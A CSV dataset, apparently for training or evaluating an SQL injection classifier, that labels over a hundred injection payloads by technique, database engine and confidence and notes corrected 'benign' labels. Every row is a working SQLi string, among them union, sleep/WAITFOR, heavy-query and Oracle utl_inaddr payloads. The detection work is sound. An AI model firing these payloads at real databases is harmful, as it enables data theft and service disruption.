id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
20557,1'|| ( select 'feyg' from dual where 7734 = 7734 and 3843 = 6724#,boolean_blind,oracle,0.7,"Pattern match: 'AND number = number' inequality + 'dual' table → Oracle boolean_blind (P3); query result branching",2
20558,"1"" ) ) ) and 7533 = 7533 and ( ( ( ""xopd"" = ""xopd",boolean_blind,generic,0.65,"Pattern match: 'AND 7533=7533' tautology + 'AND xopd=xopd' tautology → boolean_blind (P3); alters WHERE logic",2
20559,"1%"" ) and elt ( 7436 = 9874,9874 ) and ( ""%"" = """,boolean_blind,mysql,0.85,"Pattern match: 'ELT(condition, value)' → MySQL boolean_blind (P3); conditional element selection based on equality",2
20560,-2866' ) ) or 4491 = 9429#,boolean_blind,generic,0.65,"Pattern match: 'OR number = number' inequality → boolean_blind (P3); modifies WHERE clause boolean logic",2
20561,"1' ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",boolean_blind,generic,0.8,"Pattern match: 'sysusers' Cartesian joins → MSSQL heavy_query (P4) detected, but rule prefers boolean_blind (P3)",2
20562,end and ( ( 'pfrt' = 'pfrt,boolean_blind,generic,0.5,"UNCERTAIN: 'END' keyword + boolean tautology 'pfrt=pfrt' but 'END' suggests CASE statement fragment",1
20563,1 ) as ozga where 4002 = 4002 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.95,"Pattern match: 'pg_sleep(5)' → PostgreSQL time_blind (P5); forces synchronous sleep in query execution",3
20564,"iif ( 7011 = 2522,1,1/0 )",boolean_blind,mssql,0.65,"Pattern match: 'IIF()' MSSQL conditional function; rule says benign but IIF is MSSQL-specific boolean construct",1
20565,-4904' ) as ogyu where 2821 = 2821 or 5982 = 1643,boolean_blind,generic,0.65,"Pattern match: 'OR number = number' inequality → boolean_blind (P3); alters OR condition in WHERE",2
20566,-3339' or 8571 = 8571--,boolean_blind,generic,0.65,"Pattern match: 'OR 8571=8571' tautology → boolean_blind (P3); forces true condition evaluation",2
20567,"1%' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( '%' = '",time_blind,oracle,0.95,"Pattern match: 'dbms_pipe.receive_message()' → Oracle time_blind (P5); synchronous message receive causes delay",3
20568,"1"" or elt ( 6272 = 6272,sleep ( 5 ) ) and ""hvic"" like ""hvic",time_blind,mysql,0.75,"UNCERTAIN: 'ELT()' (P3) vs 'sleep()' (P5); sleep function is stronger signal → prioritizing time_blind (P5)",2
20569,1' and ( 3020 = 3020 ) *6703 and 'hnvf' = 'hnvf,boolean_blind,generic,0.65,"Pattern match: 'AND number=number' tautology + arithmetic operator → boolean_blind (P3); modifies WHERE logic",2
20570,"1' where 3125 = 3125 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",heavy_query,mysql,0.85,"Pattern match: 'repeat(char, 500000000)' + 'regexp_substring' → heavy_query (P4); resource exhaustion via string operations",2
20571,"-6108' ) union all select 2519,2519,2519,2519--",union_based,generic,0.85,"Pattern match: 'UNION ALL SELECT' numeric columns → union_based (P7); classic UNION exfiltration",3
20572,"1"" ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.75,"Pattern match: system table Cartesian product + boolean context; conflict between boolean_blind (P3) and heavy_query (P4)",2
20573,"1"" ) where 2839 = 2839 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,oracle,0.8,"Pattern match: 'all_users' table Cartesian joins → heavy_query (P4) but labeled boolean_blind (P3)",2
20574,"-6848"" ) ) or 4071 = 5312",boolean_blind,generic,0.65,"Pattern match: 'OR number = number' inequality → boolean_blind (P3); manipulates WHERE clause logic",2
20575,"1"" ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,"Pattern match: 'generate_series(1,5000000)' → PostgreSQL heavy_query (P4); Cartesian product DoS",3
20576,"1%' ) ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,"Pattern match: 'UNION ALL SELECT null' columns → union_based (P7); multiple NULL alignment",3
20577,( select * from ( select ( sleep ( 5 ) ) ) srmq ) #,time_blind,mysql,0.9,"Pattern match: 'sleep(5)' nested SELECT → MySQL time_blind (P5); delays response via sleep",2
20578,1'+ ( select 'stsu' where 2386 = 2386 or sleep ( 5 ) #,time_blind,mysql,0.9,"Pattern match: 'sleep(5)' in WHERE OR clause → MySQL time_blind (P5); conditional time delay",2
20579,"1 ) where 9149 = 9149 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,postgresql,0.85,"Pattern match: 'repeat(...,5000000000)' large iteration + 'regexp_substring' → heavy_query (P4); DoS via CPU",2
20580,-5470' ) ) or ( 8459 = 8459 ) *4906 and ( ( 'oeam' = 'oeam,boolean_blind,generic,0.65,"Pattern match: 'OR (8459=8459)' tautology + arithmetic → boolean_blind (P3); modifies WHERE logic",2
20581,1'|| ( select 'hlxd' from dual where 2615 = 2615 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ||',error_based,oracle,0.95,"Pattern match: 'utl_inaddr.get_host_address' → Oracle error_based (P4); DNS error exfiltration technique",2
20582,-4583' ) as evbo where 6055 = 6055 union all select 6055--,union_based,generic,0.85,"Pattern match: 'UNION ALL SELECT' → union_based (P7); classic UNION column alignment",3
20583,"1%' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( '%' = '",time_blind,sqlite,0.85,"Pattern match: 'randomblob(500000000)' → SQLite time_blind (P5); memory allocation delay",2
20584,1'|| ( select 'kptj' from dual where 5123 = 5123,boolean_blind,oracle,0.7,"Pattern match: 'dual' table + 'WHERE 5123=5123' tautology → Oracle boolean_blind (P3); boolean context with equality",2
20585,"-3126 ) ) union all select 6718,6718,6718,6718,6718--",union_based,generic,0.85,"Pattern match: 'UNION ALL SELECT' numeric columns → union_based (P7); multiple columns",3
20586,"-7448 union all select 4072,4072#",union_based,generic,0.85,"Pattern match: 'UNION ALL SELECT' → union_based (P7); classic UNION technique",3
20587,"1"" ) ) and 9800 = 8713",boolean_blind,generic,0.65,"Pattern match: 'AND 9800 = 8713' inequality → boolean_blind (P3); boolean condition injection",2
20588,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and 'fvda' like 'fvda",time_blind,oracle,0.95,"Pattern match: 'dbms_pipe.receive_message()' + 'dual' → Oracle time_blind (P5); synchronous wait",3
20589,"1' in boolean mode ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) #",boolean_blind,db2,0.8,"Pattern match: 'sysibm.systables' Cartesian joins; rule says boolean_blind but Cartesian product suggests heavy_query",2
20590,"-3194"" ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""erua"" = ""erua",error_based,oracle,0.95,"Pattern match: 'utl_inaddr.get_host_address' → Oracle error_based (P4); DNS resolution error",2
20591,"-4919 ) union all select 2608,2608,2608,2608,2608,2608#",union_based,generic,0.85,"Pattern match: 'UNION ALL SELECT' → union_based (P7); multiple numeric columns",3
20592,"1"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )",boolean_blind,firebird,0.85,"Pattern match: 'rdb$database' + 'CASE WHEN' conditional → Firebird boolean_blind (P3); boolean branching",2
20593,"-2434' ) ) ) union all select 5509,5509,5509,5509,5509,5509,5509--",union_based,generic,0.85,"Pattern match: 'UNION ALL SELECT' multiple columns → union_based (P7)",3
20594,"-7568"" ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""jxge"" like ""jxge",error_based,oracle,0.95,"Pattern match: 'utl_inaddr.get_host_address' → Oracle error_based (P4); DNS error exfiltration",2
20595,"1"" where 7015 = 7015 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",error_based,mysql,0.95,"Pattern match: 'extractvalue()' with 'concat' data exfiltration → MySQL error_based (P4); XPath error technique",3
20596,"1"" ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ""hbgv"" = ""hbgv",boolean_blind,mysql,0.75,"UNCERTAIN: 'ELT()' boolean (P3) vs 'exp()' error (P4); prioritizing boolean_blind due to context",2
20597,"-1869"" ) ) ) union all select 7122,7122,7122,7122,7122,7122,7122,7122,7122--",union_based,generic,0.85,"Pattern match: 'UNION ALL SELECT' multiple columns → union_based (P7)",3
20598,-8004%' ) or ( 2301 = 7504 ) *7504 and ( '%' = ',boolean_blind,generic,0.65,"Pattern match: 'OR number = number' inequality + arithmetic → boolean_blind (P3)",2
20599,"iif ( 1378 = 6569,1,1/0 )",boolean_blind,mssql,0.65,"Pattern match: 'IIF()' MSSQL conditional; heuristic detects benign but IIF is MSSQL-specific function",1
20600,"1, ( select ( case when ( 5726 = 5275 ) then 1 else 1/ ( select 0 ) end ) )",boolean_blind,generic,0.75,"Pattern match: 'CASE WHEN' with division-by-zero error → boolean_blind (P3) with error signal component",2
20601,"1"" ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""blkt"" like ""blkt",boolean_blind,mysql,0.8,"Pattern match: 'ELT()' boolean condition within group-by → MySQL boolean_blind (P3); complex boolean extraction",2
20602,"-2605%' ) ) ) union all select 4738,4738#",union_based,generic,0.85,"Pattern match: 'UNION ALL SELECT' → union_based (P7)",3
20603,"1%"" ) ) ) waitfor delay '0:0:5' and ( ( ( ""%"" = """,time_blind,mssql,0.95,"Pattern match: 'WAITFOR DELAY' → MSSQL time_blind (P5); T-SQL synchronous delay",3
20604,"1' ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( 'gydh' = 'gydh",error_based,mysql,0.95,"Pattern match: 'updatexml()' → MySQL error_based (P4); XPath error injection with ELT boolean",2
20605,"1' union all select null,null,null,null,null,null,null--",union_based,generic,0.85,"Pattern match: 'UNION ALL SELECT null' → union_based (P7); NULL column alignment",3
20606,5739-5738,benign,generic,0.5,"No SQLi signals detected; arithmetic expression only; payload appears to be benign mathematical operation",1
20607,"-7296%' ) ) ) union all select 9322,9322,9322,9322--",union_based,generic,0.85,"Pattern match: 'UNION ALL SELECT' → union_based (P7)",3
20608,select ( case when ( 7033 = 1594 ) then 7033 else 7033* ( select 7033 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.8,"Pattern match: 'CASE WHEN' + 'information_schema' → MySQL boolean_blind (P3); conditional DB enumeration",2
20609,"1"" and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""qzzg"" like ""qzzg",boolean_blind,mysql,0.75,"UNCERTAIN: 'ELT()' (P3) vs 'exp()' error operator (P4); prioritizing boolean_blind due to context structure",2
20610,"1%"" and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.95,"Pattern match: 'pg_sleep(5)' → PostgreSQL time_blind (P5); synchronous sleep in SELECT",3
20611,"1' ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",error_based,mysql,0.95,"Pattern match: 'extractvalue()' + 'benchmark()' → MySQL error_based (P4) with time component; XPath error technique",3
20612,"-4044%"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ""%"" = """,error_based,oracle,0.95,"Pattern match: 'utl_inaddr.get_host_address' → Oracle error_based (P4); DNS error injection",2
20613,"1"" ) ) as nejd where 2885 = 2885",benign,generic,0.5,"Pattern match: WHERE tautology 'WHERE 2885=2885' but no clear injection vector; labeled benign in source",1
20614,-2745 ) ) as aywp where 9735 = 9735 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,boolean_blind,firebird,0.85,"Pattern match: 'rdb$database' metadata + 'CASE WHEN' → Firebird boolean_blind (P3)",2
20615,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( 9847 = 9847",time_blind,mysql,0.9,"Pattern match: 'benchmark(5000000, md5)' → MySQL time_blind (P5); CPU-intensive delay via MD5",3
20616,"-1844"" ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( ""abdw"" like ""abdw",boolean_blind,mysql,0.65,"Pattern match: 'make_set(condition, value)' → MySQL boolean_blind (P3); conditional set selection",1
20617,"-8651"" ) where 8391 = 8391 union all select 8391,8391#",union_based,generic,0.85,"Pattern match: 'UNION ALL SELECT' → union_based (P7)",3
20618,-4562' ) or 3038 = 3038,boolean_blind,generic,0.65,"Pattern match: 'OR 3038=3038' tautology → boolean_blind (P3); WHERE clause modification",2
20619,"1"" ) where 7840 = 7840 union all select null,null#",union_based,generic,0.85,"Pattern match: 'UNION ALL SELECT null' → union_based (P7)",3
20620,"-7382' ) ) or make_set ( 9425 = 4330,4330 ) and ( ( 'tvaz' like 'tvaz",boolean_blind,mysql,0.65,"Pattern match: 'make_set()' → MySQL boolean_blind (P3); conditional element selection",1
20621,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ""yobb"" like ""yobb",boolean_blind,firebird,0.8,"Pattern match: multiple 'rdb$*' table Cartesian joins; priority conflict between boolean_blind (P3) and heavy_query (P4)",2
20622,"1' and elt ( 1210 = 1210,sleep ( 5 ) )",time_blind,mysql,0.75,"UNCERTAIN: 'ELT()' (P3) vs 'sleep()' (P5); sleep is stronger signal → MySQL time_blind (P5)",2
20623,"-9037%"" union all select 6583#",union_based,generic,0.85,"Pattern match: 'UNION ALL SELECT' → union_based (P7)",3
20624,"1"" where 7022 = 7022",benign,generic,0.5,"Pattern match: only 'WHERE tautology' with no injection signals; appears benign",1
20625,"-4285' ) ) ) union all select 8819,8819,8819,8819,8819,8819,8819,8819#",union_based,generic,0.85,"Pattern match: 'UNION ALL SELECT' → union_based (P7)",3
20626,1 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) -- jduw,boolean_blind,mysql,0.85,"Pattern match: 'RLIKE' with 'CASE WHEN' boolean → MySQL boolean_blind (P3); regex-based conditional",2
20627,"1' ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and 'fsvr' = 'fsvr",heavy_query,generic,0.85,"Pattern match: 'repeat(...,500000000)' + 'regexp_substring' → heavy_query (P4); DoS via string operations",1
20628,"1 and elt ( 1210 = 1210,sleep ( 5 ) )",time_blind,mysql,0.75,"UNCERTAIN: 'ELT()' (P3) vs 'sleep()' (P5); sleep is stronger signal → MySQL time_blind (P5)",2
20629,select case when 2948 = 7279 then 1 else null end--,boolean_blind,generic,0.7,"Pattern match: 'CASE WHEN' conditional → boolean_blind (P3); query result depends on condition",2
20630,"1%' union all select null,null,null--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' injection signal → union_based (P7); false negative correction",2
20631,"-8133' ) union all select 6417,6417,6417,6417,6417,6417,6417,6417--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative correction",2
20632,"-5396'|| ( select 'fjhd' from dual where 4019 = 4019 union all select 4019,4019,4019,4019#",union_based,oracle,0.85,"Labeled benign but contains 'UNION ALL SELECT' + 'dual' table → Oracle union_based (P7); false negative",2
20633,"1%"" ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( ""%"" = """,error_based,mysql,0.9,"Labeled benign but contains 'updatexml()' + 'ELT()' → MySQL error_based (P4); false negative due to complexity",1
20634,"1' ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( 'ogpg' = 'ogpg",time_blind,mysql,0.75,"Labeled benign but contains 'ELT()+sleep()' → MySQL time_blind (P5); sleep is dominant signal",1
20635,-1876%' ) union all select 6463--,union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative correction",2
20636,-1908' ) ) ) union all select 7665#,union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative correction",2
20637,"1 ) as tjwa where 1173 = 1173 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,0.9,"Labeled benign but contains 'extractvalue()' + 'ELT()' → MySQL error_based (P4); false negative",1
20638,"-6659' ) where 1256 = 1256 union all select 1256,1256--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative correction",2
20639,"-1598 ) ) ) union all select 9418,9418,9418,9418,9418,9418,9418#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative correction",2
20640,"1'|| ( select 'mzsy' where 4940 = 4940 or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,0.75,"Labeled benign but contains 'ELT()+sleep()' → MySQL time_blind (P5); sleep prioritized",1
20641,"1%' and elt ( 1210 = 1210,sleep ( 5 ) ) and '%' = '",time_blind,mysql,0.75,"Labeled benign but contains 'ELT()+sleep()' → MySQL time_blind (P5); sleep is dominant",1
20642,"1%' ) ) ) union all select null,null,null,null,null,null--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT null' → union_based (P7); false negative correction",2
20643,1'|| ( select 'ptkj' from dual where 6263 = 6263 union all select null--,union_based,oracle,0.85,"Labeled benign but contains 'UNION ALL SELECT' + 'dual' → Oracle union_based (P7); false negative",2
20644,"1%' ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.95,"Labeled benign but contains 'dbms_pipe.receive_message' → Oracle time_blind (P5); false negative correction",2
20645,"1"" ) as wvxt where 7321 = 7321 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.95,"Labeled benign but contains 'dbms_pipe.receive_message' → Oracle time_blind (P5); false negative",2
20646,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual# gnga",time_blind,oracle,0.95,"Labeled benign but contains 'dbms_pipe.receive_message' + 'dual' → Oracle time_blind (P5)",2
20647,"1 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) # ogwe",error_based,mysql,0.9,"Labeled benign but contains 'extractvalue()' + 'ELT()' → MySQL error_based (P4); false negative",1
20648,"1"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ""mezx"" like ""mezx",boolean_blind,mysql,0.8,"Labeled benign but contains 'UNION' + 'ELT()' boolean + 'RAND()' → MySQL complex boolean (P3); false negative",1
20649,"-7511 ) ) as xqzf where 9939 = 9939 union all select 9939,9939,9939,9939,9939,9939,9939--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20650,"1 ) as nlig where 5964 = 5964 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,"Labeled benign but contains 'benchmark()' → MySQL time_blind (P5); false negative",1
20651,"1%"" ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ""%"" = """,time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20652,1 ) ) as kccx where 7547 = 7547 union all select null--,union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20653,"-6595 ) ) ) union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20654,"1' ) as vlwh where 9403 = 9403 or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,0.75,"Labeled benign but contains 'ELT()+sleep()' → MySQL time_blind (P5); false negative",1
20655,"1%"" ) union all select null,null#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20656,1' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( 'ljhc' = 'ljhc,time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20657,"waitfor delay '0:0:5' and ""lhcv"" = ""lhcv",time_blind,mssql,0.95,"Labeled benign but contains 'WAITFOR DELAY' → MSSQL time_blind (P5); clear false negative",2
20658,"1 ) ) ) union all select null,null#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20659,1%' waitfor delay '0:0:5'--,time_blind,mssql,0.95,"Labeled benign but contains 'WAITFOR DELAY' → MSSQL time_blind (P5); false negative",2
20660,"1' where 7080 = 7080 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,"Labeled benign but contains 'benchmark()' → MySQL time_blind (P5); false negative",1
20661,"1 ) ) as rsnb where 3168 = 3168 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.9,"Labeled benign but contains 'extractvalue()' + 'benchmark()' → MySQL error_based (P4); false negative",1
20662,"-9871"" ) union all select 9082#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
